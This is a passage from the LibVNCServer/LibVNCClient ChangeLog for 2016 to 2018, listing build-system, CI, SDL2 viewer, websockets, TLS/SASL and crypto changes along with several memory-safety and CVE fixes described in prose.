	webclients/novnc/vendor/pako/lib/zlib/zstream.js,
	webclients/novnc/vendor/promise.js,
	webclients/novnc/vendor/sinon.js, webclients/novnc/vnc.html,
	webclients/novnc/vnc_auto.html: Update bundled noVNC to latest
	release 1.0.0 Closes #148

2018-10-01  Christian Beier <dontmind@freeshell.org>

	* libvncserver/httpd.c: httpd: send proper MIME type for Javascript
	files re #148

2018-10-01  Christian Beier <dontmind@freeshell.org>

	* libvncclient/ultra.c: LibVNCClient: make sure Ultra decoding
	cannot dereference a null pointer Closes #254

2018-09-30  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: require some form of hton64() for
	websockets Closes #127

2018-09-30  DRC <information@virtualgl.org>

	* libvncserver/ws_decode.h: Fix compilaton with gcc 4.4.x Closes #204 Signed-off-by: Christian Beier <dontmind@freeshell.org>

2018-09-29  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: LibVNCClient: fix three possible heap
	buffer overflows An attacker could feed `0xffffffff`, causing a `malloc(0)` for the
	buffers which are subsequently written to.  Closes #247

2018-09-29  Christian Beier <dontmind@freeshell.org>

	* libvncclient/corre.c: LibVNCClient: make sure ReadFromRFBServer()
	does not write after buffer end in CoRRE decoding Closes #250

2018-09-29  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: LibVNCClient: fix possible infinite loop Closes #251

2018-09-29  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: LibVNCClient: don't leak uninitialised
	memory to remote The pad fields of the rfbClientCutTextMsg and rfbKeyEventMsg could
	contain arbitray memory belonging to the process, don't leak this to
	the remote.  Closes #252

2018-09-29  Christian Beier <dontmind@freeshell.org>

	* examples/repeater.c, libvncclient/rfbproto.c: When connecting to a
	repeater, only send initialised string Closes #253

2018-09-29  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: build the repeater example as well

2018-09-27  Christian Beier <dontmind@freeshell.org>

	* libvncclient/tight.c, rfb/rfbclient.h: Remove the turbojpeg.h
	dependency from public headers Closes #230

2018-09-27  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: fix build error that occured on Windows
	with CMake 3.12

2018-09-27  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: print CMake version

2018-09-26  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: only do jpeg-turbo tests if a libjpeg was
	found

2018-09-26  Christian Beier <dontmind@freeshell.org>

	* .gitignore: Remove .gitignore obsoleted by CMake re #248

2018-08-10  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: make get_link_libraries() not crash when
	there are no linked libraries at all

2018-08-09  Quentin BUATHIER <qbuathier@tetrane.com>

	* libvncserver/main.c, libvncserver/rfbserver.c, rfb/rfb.h: Fix the
	concurrent issue hapenning between the freeing of the client and the
	clientOutput thread

2018-08-08  Quentin BUATHIER <qbuathier@tetrane.com>

	* libvncserver/main.c: Fix use-after-free

2018-07-30  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: work around
	SDL_TEXTINPUT not generating chars with CTRL down

2018-07-30  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: handle mouse wheel
	events

2018-07-28  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: adhere to C89

2018-07-28  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: implement Unicode
	input handling

2018-07-26  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: install SDL2 dev packages for OSX as well

2018-07-26  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: install SDL2 dev packages

2018-07-26  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: remove obsolete
	video scaling code

2018-07-26  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, client_examples/SDLvncviewer.c,
	client_examples/scrap.c, client_examples/scrap.h: SDLvncviewer: use
	SDL2 for clipboard handling By using this, we can get rid of our own homebrewn solution
	scrap.[c|h] and drop X11 from the build system.

2018-07-25  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: make input work with
	SDL2 ... at least somewhat. This is far from perfect but no regression
	compared to SDL1.2 functionality.

2018-05-16  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c, client_examples/scrap.c: 
	SDLvncviewer: make display work with SDL2

2018-05-12  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, cmake/Modules/FindSDL2.cmake: CMake: look for SDL2
	instead of SDL FindSDL2.cmake was downloaded from

	https://github.com/tcbrindle/sdl2-cmake-scripts/blob/master/FindSDL2.cmake

2018-07-25  Christian Beier <dontmind@freeshell.org>

	* client_examples/SDLvncviewer.c: SDLvncviewer: add a very simple
	GetCredentials callback

2018-07-08  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/rfbconfig.h.cmakein: CMake: add a
	LIBVNCSERVER_HAVE_GNUTLS #define

2018-07-08  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/rfb.h: build: decouple GnuTLS|OpenSSL
	detection from WebSockets support

2018-06-29  Christian Beier <dontmind@freeshell.org>

	* common/rfbcrypto_polarssl.c: crypto: remove polarssl wrapper This is not even in the build system anymore.

2018-06-29  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: declare that websockets depend on crypto

2018-06-29  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbconfig.h.cmakein: build: remove
	LIBVNCSERVER_WITH_CLIENT_TLS #define It is not used anywhere anymore.

2018-06-29  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, {libvncserver => common}/rfbcrypto.h,
	{libvncserver => common}/rfbcrypto_gnutls.c, {libvncserver =>
	common}/rfbcrypto_included.c, {libvncserver =>
	common}/rfbcrypto_openssl.c, {libvncserver =>
	common}/rfbcrypto_polarssl.c: crypto: move to common As of now, only LibVNCServer makes uses of these digest functions
	_and_ they depend on sys/uio.h, but in the future LibVNCClient will
	need those as well.

2018-06-26  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #235 from eddiejames/master Tight: export SendCompressedData and SendTightHeader functions

2018-06-16  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: remove unused statements

2018-06-16  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: remove Visual Studio 2013 as it somehow
	got broken at AppVeyor's side

2018-06-16  Christian Beier <dontmind@freeshell.org>

	* README: README: remove reference to functions not existing anymore Closes #202.

2018-05-14  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #215 from
	BastiaanOlij/fix_nozlib_compile_error libvncclient: zrle.c: Move undef of REALBPP down rfbproto.c which includes this file expects an undefined REALBPP
	after the inclusion. Do this whether or not there is zlib available.

2018-03-24  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml, deps/sasl-fix-snprintf-macro.patch: AppVeyorCI:
	build with Visual Studio 2017 as well

2018-03-24  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: rfbserver: fix a typo

2018-03-24  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbserver.c: rfbserver: get rid of inttypes.h again

2018-03-24  Christian Beier <dontmind@freeshell.org>

	* libvncclient/sasl.h: libvncclient/sasl: prefix the header guard
	(again) to fix a warning

2018-03-24  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, client_examples/scrap.c: SDLvncviewer: enable the
	X11 clipboard if X11 was found

2018-03-13  Christian Beier <dontmind@freeshell.org>

	* examples/androidvncserver.c: androidvncserver: fix print_usage and
	a compiler warning

2018-03-13  Christian Beier <dontmind@freeshell.org>

	* examples/androidvncserver.c: androidvncserver: add some
	boilerplate comment that should have been in the 1st code drop

2018-03-13  Christian Beier <dontmind@freeshell.org>

	* examples/androidvncserver.c: androidvncserver: fix a quite serious
	typo Closes #225.

2018-02-26  Petr PÃ­saÅ <ppisar@redhat.com>

	* libvncserver/rfbserver.c: Limit client cut text length to 1 MB This patch constrains a client cut text length to 1 MB. Otherwise a
	client could make server allocate 2 GB of memory and that seems to
	be to much to classify it as a denial of service.  The limit also prevents from an integer overflow followed by copying
	an uninitilized memory when processing msg.cct.length value larger
	than SIZE_MAX or INT_MAX - sz_rfbClientCutTextMsg.  This patch also corrects accepting length value of zero (malloc(0)
	is interpreted on differnet systems differently).  CVE-2018-7225 <https://github.com/LibVNC/libvncserver/issues/218>

2018-02-27  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: set path to devenv tool based on
	environment

2018-02-26  Christian Beier <cb@shoutrlabs.com>

	* examples/androidvncserver.c: androidvncserver: remove keycodes not
	in NDK anymore This makes the android VNC server example build again.

2018-01-27  Bastiaan Olij <mux213@gmail.com>

	* libvncclient/zrle.c: Moved undef of REALBPP down

2018-01-23  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #203 from dcommander/turbovnc-client Include Tight decoding optimizations from TurboVNC

2018-01-22  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #197 from wwqwwqwd/master Add trle decoder

2017-09-02  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, libvncclient/rfbproto.c, libvncclient/{rfbsasl.c
	=> sasl.c}, libvncclient/{rfbsasl.h => sasl.h},
	libvncclient/sockets.c: libvncclient: rename rfbsasl.[c|h] to
	sasl.[c|h] to be in line with naming of other files

2017-09-02  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c, libvncclient/rfbsasl.h,
	libvncclient/sockets.c, rfb/rfbproto.h: Move HAVE_SASL #ifdefs into
	header file to have less LOC

2017-09-02  Christian Beier <dontmind@freeshell.org>

	* client_examples/ppmtest.c: Fix building whithout SASL

2017-07-07  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #188 from Cordius/master fix: the function should not return a value

2017-04-21  simon <root@simon.home>

	* .appveyor.yml, CMakeLists.txt, client_examples/ppmtest.c,
	libvncclient/rfbproto.c, libvncclient/rfbsasl.c,
	libvncclient/rfbsasl.h, libvncclient/sockets.c, libvncclient/tls.h,
	libvncclient/tls_gnutls.c, libvncclient/tls_none.c,
	libvncclient/tls_openssl.c, libvncclient/vncviewer.c,
	rfb/rfbclient.h, rfb/rfbconfig.h.cmakein, rfb/rfbproto.h: Added SASL
	authentication support Added SASL support to OpenSSL

2017-06-20  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #161 from jlesage/master-base64-compat websockets: Fixed compilation of websockets on systems where there
	is no implementation of base64 functions.

2017-05-15  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #158 from kempniu/gtk-vnc-0.7.0-compat websockets: Ensure compatibility with gtk-vnc 0.7.0+

2017-05-14  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: websockets: only build tests for a
	websockets-enabled build

2017-05-14  Christian Beier <dontmind@freeshell.org>

	* libvncserver/websockets.c, rfb/rfb.h: websockets: restore
	webSocketCheckDisconnect() to keep API compatibility

2017-02-27  Andreas Weigel <andreaswe@securepoint.de>

	* libvncserver/ws_decode.c, libvncserver/ws_decode.h: remove
	potential 64 bit len overflow calculation

2017-02-27  Andreas Weigel <andreaswe@securepoint.de>

	* libvncserver/websockets.c, libvncserver/ws_decode.c,
	libvncserver/ws_decode.h, test/wsmaketestframe.py, test/wstest.c,
	test/wstestdata.inc: add decode support for continuation frames use FIN bit and implement opcode 0x00 make consistent use of uint64_t for big frame sizes

2017-02-23  Andreas Weigel <andreaswe@securepoint.de>

	* CMakeLists.txt, test/wsmaketestframe.py, test/wstest.c,
	test/{wstestdata.c => wstestdata.inc}: fix problems in test and
	requests for cmake build add missing stdarg header fix hardcoded errno integer values in tests add dependency to wstestdata and rename to prevent building it as c
	source

2017-02-23  Andreas Weigel <andreaswe@securepoint.de>

	* libvncserver/rfbserver.c, libvncserver/websockets.c, rfb/rfb.h: 
	remove Hixie-specific MD5 and check functions

2017-02-20  Andreas Weigel <andreaswe@securepoint.de>

	* .gitignore, CMakeLists.txt, libvncserver/ws_decode.c,
	libvncserver/ws_decode.h, test/wsmaketestframe.py, test/wstest.c,
	test/wstestdata.c: add generation wstest to cmake add wstestdata.c, because the python data generation script has too
	many dependencies remove some redundance from jpeg test creation add support for decoding close messages

2017-02-20  Andreas Weigel <andreaswe@securepoint.de>

	* .gitignore, libvncserver/websockets.c, libvncserver/ws_decode.c,
	libvncserver/ws_decode.h, test/wsmaketestframe.py, test/wstest.c: 
	add ws_decode tests modify automake to include ws_decode test add python frame generator for decode tests modify configure to only include ws_decode test if preconditions are
	fulfilled

2017-02-16  Andreas Weigel <andreaswe@securepoint.de>

	* libvncserver/websockets.c: remove obsolete hixie protocol support

2017-02-16  Andreas Weigel <andreaswe@securepoint.de>

	* libvncserver/websockets.c, libvncserver/ws_decode.c,
	libvncserver/ws_decode.h: factor out hybi decode part to make it
	testable remove direct dependency on rfbClientPtr structure in hybi decode
	function(s)

2017-02-15  Andreas Weigel <andreaswe@securepoint.de>

	* libvncserver/websockets.c: fix overflow and refactor websockets
	decode (Hybi) fix critical heap-based buffer overflow which allowed easy
	modification of a return address via an overwritten function pointer fix bug causing connections to fail due a "one websocket frame = one
	ws_read" assumption, which failed with LibVNCServer-0.9.11 refactor websocket Hybi decode to use a simple state machine for
	decoding of websocket frames

2017-05-14  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #175 from simonwaterman/x509verify Added support for X509 server certificate verification

2017-05-12  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #178 from lioncash/leak font: Fix a small resource leak in a failure case in
	rfbLoadConsoleFont()

2017-05-05  simon <root@simon.home>

	* libvncclient/tls_openssl.c, rfb/rfbclient.h: X509 certificate
	verification for OpenSSL

2017-04-25  simon <root@simon.home>

	* libvncclient/tls_gnutls.c: Removed comment left over from
	development

2017-04-25  simon <root@simon.home>

	* libvncclient/tls_gnutls.c: Modified certificate verification for
	compatibility with GnuTLS 2.12.23

2017-04-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/rfbconfig.h.cmakein: CMake: add all function
	checks that used to be in configure.ac Fixes #174

2017-04-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/{rfbconfig.h.cmake => rfbconfig.h.cmakein}: 
	CMake: properly name rfbconfig.h cmake template

2017-04-21  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: point OSX CMake to OpenSSL root dir

2017-04-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, cmake/Modules/FindFFMPEG.cmake: CMake: include a
	FindFFMPEG module and use it Thankfully taken from

	https://github.com/robotology/ycm/blob/master/find-modules/FindFFMPEG.cmake

2017-04-20  tmcqueen-materials <tmcqueen-materials@users.noreply.github.com>

	* client_examples/vnc2mpg.c: Update vnc2mpg.c correct mistaken references to update_time...

2017-04-20  simon <root@simon.home>

	* libvncclient/tls_gnutls.c: Added support for X509 server
	certificate verification as part of the handshake process.

2017-04-18  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/rfbconfig.h.cmake: CMake: set
	LIBVNCSERVER_HAVE_FORK in rfbconfig.h if fork() found

2017-04-18  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/rfbconfig.h.cmake: CMake: set
	LIBVNCSERVER_HAVE_LIBSSL in rfbconfig.h if OpenSSL found

2017-04-18  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, rfb/rfbconfig.h.cmake: CMake: detect mmap() and
	write result to rfbconfig.h

2017-04-13  tmcqueen-materials <tmcqueen-materials@users.noreply.github.com>

	* client_examples/vnc2mpg.c: Update vnc2mpg.c This update makes the example work on versions of ffmpeg newer than
	"ancient," fixes a bunch of bugs in the process, and with better
	documentation of the pitfalls.

2017-04-03  dborth <dborth@gmail.com>

	* libvncclient/vncviewer.c: Set trueColour flag to 1 instead of 255 It turns out some server implementations (namely VMware ESXi 6.5)
	expect 1 as the only non-zero value for the SetPixelFormat message
	whereas the protocol states every non-zero value is valid

	(https://github.com/rfbproto/rfbproto/blob/master/rfbproto.rst#setpixelformat).Anyway, setting this to 1 shouldn't hurt.  Fixes #141

2017-03-26  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, examples/android/README,
	examples/android/jni/Android.mk,
	examples/{android/jni/fbvncserver.c => androidvncserver.c}: CMake:
	automatically build androidvncserver when crosscompiling for Android

2017-03-26  Christian Beier <dontmind@freeshell.org>

	* README, libvncclient/listen.c, rfb/rfbclient.h: Fix building for
	Android and add build instructions to README

2017-03-26  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: when crosscompiling for Android, don't look
	for systemd

2017-03-26  Christian Beier <dontmind@freeshell.org>

	* libvncclient/vncviewer.c: Fix a compiler warning

2017-03-26  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: only build TurboJPEG unit tests if lib has
	jpeg support

2017-03-26  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: change libpng download link to sth that
	works

2017-02-22  Christian Beier <dontmind@freeshell.org>

	* TODO: Update TODO, at least a bit

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: use static zlib and libpng

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: remove check for C++ compiler We don't have any C++ sources.

2017-02-21  Christian Beier <cb@shoutrlabs.com>

	* .appveyor.yml, .travis.yml: CI: let tests output to console on
	failure

2017-02-21  Christian Beier <cb@shoutrlabs.com>

	* rfb/rfbproto.h: rfbproto: re-add erroneously removed SOCKET
	definition

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: make ctest more verbose

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c: rfbInitServer: only init Winsock once

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbproto.h: rfbproto: remove SOCKET redefinitions

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c: Add an rfbLogPError that shows something on
	WIN32

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbproto.h: Fix "rfbBool's size is not 1" runtime error with
	MSVC

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: only add tjunittest if turbojpeg found

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: really add the test config to AppVeyor

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: Revert "AppVeyorCI: supply a test config aka build
	type" This reverts commit e18ec43c2df1a91911f8fd98bff52a232b6f757c.

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: AppVeyorCI: supply a test config aka build type

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* README: README: add build instructions

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyorCI: run them tests

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* test/copyrecttest.c: test: tell MSVC to use math defines

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #156 from The-42/drop-autotools drop autotools

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: enable the tests that succeed

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: add libm to tests only on Unix

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: build the tests

2017-02-21  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: properly name examples as examples, not
	tests

2017-02-20  Christian Beier <dontmind@freeshell.org>

	* libvncserver/scale.c: Fix building in C89 mode FIXME: this should probably be refactored into a common header.

2017-02-20  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: make shared-lib build configurable and
	choose sensible platform defaults

2017-02-20  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: set examples's output dirs in a
	cross-platform way

2017-02-14  MichaÅ KÄpieÅ <github@kempniu.pl>

	* libvncserver/websockets.c: Ensure compatibility with gtk-vnc
	0.7.0+

2017-02-08  Bert van Hall <bert.vanhall@gmx.de>

	* LibVNCServer.spec.in, Makefile.am, autogen.sh,
	client_examples/Makefile.am, configure.ac, examples/Makefile.am,
	examples/android/Makefile.am, libvncclient.pc.in,
	libvncclient/Makefile.am, libvncserver-config.in,
	libvncserver.pc.in, libvncserver/Makefile.am, m4/.gitignore,
	m4/ax_prefix_config_h.m4, m4/ax_type_socklen_t.m4, m4/libgcrypt.m4,
	test/Makefile.am, webclients/Makefile.am,
	webclients/java-applet/Makefile.am,
	webclients/java-applet/ssl/Makefile.am: drop autotools Since autotools officially is no longer supported (see various
	github issues), drop the related infrastructure to stop tempting
	people to use it for building.  Signed-off-by: Bert van Hall <bert.vanhall@gmx.de>

2017-01-31  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #153 from The-42/openssl-1.1.x-support Openssl 1.1.x support

2017-01-31  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: set OpenSSL include dir regardless of
	websockets being enabled or not

2017-01-31  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbint.h.cmake: CMake: that file ain't used no more

2017-01-29  Christian Beier <dontmind@freeshell.org>

	* examples/vncev.c: Fix vncev example compilation on Windows

2017-01-29  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: the blooptest example needs pthreads

2017-01-29  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: install a newer CMake on Linux

2017-01-29  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: fix examples linking when building with
	MSVC

2017-01-29  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: as of now, the tight sources need libjpeg,
	libpng alone is not enough

2017-01-29  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyor: detect libpng for main build

2017-01-29  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyor: more libpng build tuning

2016-11-18  Christian Beier <dontmind@freeshell.org>

	* README: AppveyorCI: add badge.

2017-01-29  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyor: fix libpng download cmd

2017-01-28  Christian Beier <dontmind@freeshell.org>

	* .appveyor.yml: AppVeyor: add appveyor.yml from ci branch.

2017-01-28  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbcrypto.h: Fix building websockets with GnuTLS.

2017-01-28  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbcrypto.h: Fix typo

2017-01-28  Christian Beier <dontmind@freeshell.org>

	* libvncserver/rfbcrypto.h: Fix websockets building

2017-01-28  Christian Beier <dontmind@freeshell.org>

	* common/md5.h, libvncserver/httpd.c, libvncserver/rfbcrypto.h,
	libvncserver/rfbserver.c,
	libvncserver/tightvnc-filetransfer/filetransfermsg.c,
	libvncserver/tightvnc-filetransfer/handlefiletransferrequest.c,
	libvncserver/websockets.c, rfb/rfb.h: Various #ifdef fixes to allow
	building with MSVC2014

2017-01-28  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: as of now, websockets support requires
	sys/uio.h

2017-01-28  Christian Beier <dontmind@freeshell.org>

	* rfb/rfbconfig.h.cmake: CMake: add a HAVE_SYS_UIO_H flag to
	rfbconfig.h

2017-01-28  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: TightVNC-filetransfer requires pthreads as
	of now

2017-01-28  Christian Beier <dontmind@freeshell.org>

	* common/vncauth.c, libvncclient/listen.c, libvncclient/sockets.c,
	rfb/rfbclient.h: Fix LibVNCClient compilation with MSVC 2014

2017-01-28  CHris B <cb@shoutr.net>

	* CMakeLists.txt: CMake: fix build system generation when zlib or
	OpenSSL not found

2017-01-28  CHris B <cb@shoutr.net>

	* CMakeLists.txt: CMake: do not include NOTFOUND libs in pkg-config
	snippets

2017-01-22  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: make the build configurable.

2016-11-18  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: remove platform-specific flags.

2017-01-02  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: bump version.

2017-01-02  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, libvncclient.pc.cmakein: CMake: generate and
	install pkgconfig files.

2017-01-02  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt, libvncclient.pc.cmakein, libvncserver.pc.cmakein: 
	CMake: bump SOVERSION to 1.  Fixes https://github.com/LibVNC/libvncserver/issues/149

2017-01-02  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: update bugreport path

2016-12-30  Christian Beier <cb@shoutrlabs.com>

	* libvncserver/websockets.c: Make websockets code build on OSX
	without SSL.

2016-12-30  Christian Beier <cb@shoutrlabs.com>

	* CMakeLists.txt: Fix some OSX linker problems.

2016-12-30  Christian Beier <dontmind@freeshell.org>

	* libvncserver/websockets.c: Use unprefixed b64_* functions in
	websockets code.

2016-12-30  Christian Beier <dontmind@freeshell.org>

	* common/md5.c, common/md5.h: Fix building on OSX without SSL.

2016-12-30  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: use newer dist.

2016-12-30  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: CMP0037 requires CMake 3.0.

2016-12-30  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: output examples to respective directories.

2016-11-18  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: switch to CMake.  Conflicts:         .travis.yml

2016-12-30  Christian Beier <dontmind@freeshell.org>

	* ChangeLog: Update ChangeLog.

2016-12-29  Christian Beier <dontmind@freeshell.org>

	* README: Fix README markdown.

2016-12-28  Christian Beier <dontmind@freeshell.org>

	* CMakeLists.txt: CMake: version up as well.

2016-12-28  Christian Beier <dontmind@freeshell.org>

	* NEWS: Update NEWS.

2016-12-28  Christian Beier <dontmind@freeshell.org>

	* configure.ac: Version up.

2016-12-28  Christian Beier <dontmind@freeshell.org>

	* libvncserver/main.c: LibVNCServer: fix starting of an
	onHold-client in threaded mode.  Discovered by madscientist159 on 11 Jan 2015: "noted in testing with the threaded server build, whereby if
	newClientHook() returned RFB_CLIENT_ON_HOLD there was no way to
	release the hold when the server became ready"

2016-12-09  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #145 from bkylerussell/websockets Sec-WebSocket-Protocol header fix

2016-12-02  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #142 from samhed/master Write the correct length for end of header

2016-11-29  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #140 from vapier/master test/Makefile: use check_PROGRAMS

2015-01-10  Timothy Pearson <kb9vqf@pearsoncomputing.net>

	* README: Update README to reflect change from defaultPtrAddEvent to
	rfbDefaultPtrAddEvent

2016-11-25  Christian Beier <dontmind@freeshell.org>

	* libvncserver/httpd.c: httpd: rework mime type handling to
	recognise more types

2016-11-24  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: Another stab at fixing OSX build.  See https://github.com/Tarsnap/spiped/pull/92

2016-11-24  Christian Beier <dontmind@freeshell.org>

	* configure.ac: Revert "Hopefully fix building on OSX." This reverts commit 584b23fdbe12edd81119d57ddd378d10e52cc9e1.

2016-11-24  Christian Beier <dontmind@freeshell.org>

	* configure.ac: Hopefully fix building on OSX.

2016-11-24  Christian Beier <dontmind@freeshell.org>

	* .travis.yml: TravisCI: check on OSX as well, test both gcc and
	clang.

2016-11-24  Christian Beier <dontmind@freeshell.org>

	* libvncclient/rfbproto.c: Fix building on OSX.

2016-11-24  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #137 from atalax/master Fix two heap buffer overflows

2016-11-18  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #138 from stweil/master Fix some typos

2016-11-18  Stefan Weil <sw@weilnetz.de>

	* README, common/zywrletemplate.c, examples/example.c,
	examples/zippy.c: Fix some typos (it's / its) Signed-off-by: Stefan Weil <sw@weilnetz.de>

2016-11-14  Josef Gajdusek <atx@atx.name>

	* libvncclient/ultra.c: Fix heap overflow in the ultra.c decoder The Ultra type tile decoder does not use the _safe variant of the
	LZO decompress function, which allows a maliciuous server to
	overwrite parts of the heap by sending a larger-than-specified LZO
	data stream.

2016-11-14  Josef Gajdusek <atx@atx.name>

	* libvncclient/rfbproto.c: Fix heap overflows in the various
	rectangle fill functions Altough rfbproto.c does check whether the overall FramebufferUpdate
	rectangle is too large, some of the individual encoding decoders do
	not, which allows a malicious server to overwrite parts of the heap.

2016-09-24  Christian Beier <dontmind@freeshell.org>

	* : Merge pull request #129 from bkylerussell/systemd Support systemd socket activation

2016-08-14  Zac Medico <zmedico@gmail.com>

	* libvncserver/sockets.c: Support autoPort with ipv4 or ipv6
	disabled Make it possible to get autoPort behavior with either ipv4 or ipv6
	disabled, by setting rfbScreen->ipv6port or rfbScreen->port to a
	negative number. This will make it possible for x11vnc to enforce
	its -noipv6 option, as discussed in the following bug report: https://bugs.debian.org/cgi-bin/bugreport.cgi?bug=672449

2016-06-21  Balazs Ludmany <ludmany.balazs@cloud.bme.hu>

	* libvncclient/corre.c, libvncclient/hextile.c,
	libvncclient/rfbproto.c, libvncclient/rre.c, libvncclient/tight.c,
	libvncclient/ultra.c, libvncclient/vncviewer.c,
	libvncclient/zlib.c, libvncclient/zrle.c, rfb/rfbclient.h: Add
	function pointers for every type of rectangle

2016-06-05  Christian Beier <dontmind@freeshell.org>

	* NEWS: Update NEWS.

2016-06-05  Christian Beier <dontmind@freeshell.org>

